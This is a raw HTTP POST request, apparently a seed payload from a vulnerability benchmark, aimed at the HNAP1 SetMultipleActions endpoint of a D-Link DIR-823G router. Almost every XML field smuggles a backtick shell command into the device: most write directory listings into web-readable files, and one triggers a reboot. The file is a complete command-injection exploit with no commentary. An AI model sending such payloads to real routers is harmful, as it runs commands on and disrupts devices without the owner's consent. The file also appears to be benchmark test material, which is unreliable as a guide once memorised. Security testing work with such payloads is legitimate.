Vulnerabilities/CVE-2021-43474/BM-2024-00002-payload.seed1

POST /HNAP1/ HTTP/1.1
Host: 192.168.0.1
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:80.0) Gecko/20100101 Firefox/80.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: text/xml; charset=utf-8
SOAPAction: "http://purenetworks.com/HNAP1/SetMultipleActions"
HNAP_AUTH: 50C162508B221796E52D1B0C67B28E6F 169325062
X-Requested-With: XMLHttpRequest
Content-Length: 2104
Origin: http://192.168.0.1
Connection: close
Referer: http://192.168.0.1/wizard.html
Cookie: uid=jcJ4DPmyy; PrivateKey=C88B43B87E7C03EF5224D6D4949A7F1

<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema">
  <soap:Body>
    <SetMultipleActions xmlns="http://purenetworks.com/HNAP1/">
      <SetWanSettings xmlns="http://purenetworks.com/HNAP1/">
        <PppoeType>DHCPPPPoE</PppoeType>
        <Username>'`ls>/web_mtn/s2.txt`'</Username>
        <Password>'`ls>/web_mtn/s3.txt`'</Password>
        <ServiceName>'`ls>/web_mtn/s4.txt`'</ServiceName>
        <MTU>'`ls>/web_mtn/s5.txt`'</MTU>
        <WanSpeed>'`ls>/web_mtn/s6.txt`'</WanSpeed>
        <WanDuplex>'`ls>/web_mtn/s7.txt`'</WanDuplex>
        <IPAddress>'`ls>/web_mtn/s8.txt`'</IPAddress>
        <SubnetMask>'`ls>/web_mtn/s9.txt`'</SubnetMask>
        <Gateway>'`ls>/web_mtn/s10.txt`'</Gateway>
        <ConfigDNS>
          <Primary>'`ls>/web_mtn/s11.txt`'</Primary>
          <Secondary>'`ls>/web_mtn/s12.txt`'</Secondary>
        </ConfigDNS>
        <MacCloneEnable>'`ls>/web_mtn/s13.txt`'</MacCloneEnable>
        <DnsManual>'`ls>/web_mtn/s14.txt`'</DnsManual>
        <AutoReconnect>'`ls>/web_mtn/s15.txt`'</AutoReconnect>
      </SetWanSettings>
      <SetWlanRadioSettings xmlns="http://purenetworks.com/HNAP1/">
        <RadioID>'`ls>/web_mtn/s16.txt`'</RadioID>
        <SSID>D-Link_DIR-823G</SSID>
      </SetWlanRadioSettings>
      <SetWlanRadioSecurity xmlns="http://purenetworks.com/HNAP1/">
        <RadioID>RADIO_2.4GHz</RadioID>
        <SSID>D-Link_DIR-823G 5GHz</SSID>
        <Enabled>true</Enabled>
        <Key>'`ls>/web_mtn/s17.txt`'</Key>
      </SetWlanRadioSecurity>
      <SetPasswdSettings xmlns="http://purenetworks.com/HNAP1/">
        <NewPassword>'`ls ./web_mtn >/web_mtn/s20.txt`'</NewPassword>
      </SetPasswdSettings>
      <SetAutoUpgradeFirmware xmlns="http://purenetworks.com/HNAP1/">
        <AutoUpgrade>'`reboot`'</AutoUpgrade>
        <StartTime>3</StartTime>
      </SetAutoUpgradeFirmware>
    </SetMultipleActions>
  </soap:Body>
</soap:Envelope>
